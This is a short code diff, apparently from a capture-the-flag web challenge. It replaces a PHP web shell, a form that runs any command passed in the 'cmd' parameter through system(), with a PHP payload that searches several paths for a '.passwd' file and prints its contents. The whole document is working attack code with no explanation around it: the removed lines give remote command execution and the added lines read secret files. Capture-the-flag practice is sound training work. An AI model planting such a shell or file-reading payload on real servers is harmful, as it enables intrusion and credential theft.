@@ -1,16 +1,18 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd'] . ' 2>&1');
+$paths = [
+    '.passwd',
+    '../.passwd',
+    '../../.passwd',
+    '/challenge/web-serveur/ch13/.passwd'
+];
+
+echo "<pre>\n";
+foreach ($paths as $path) {
+    if (file_exists($path) && is_readable($path)) {
+        echo "Found in [{$path}]:\n";
+        echo htmlspecialchars(file_get_contents($path)) . "\n";
+        break;
     }
+}
+echo "</pre>";
 ?>
-</pre>
-</body>
-</html>
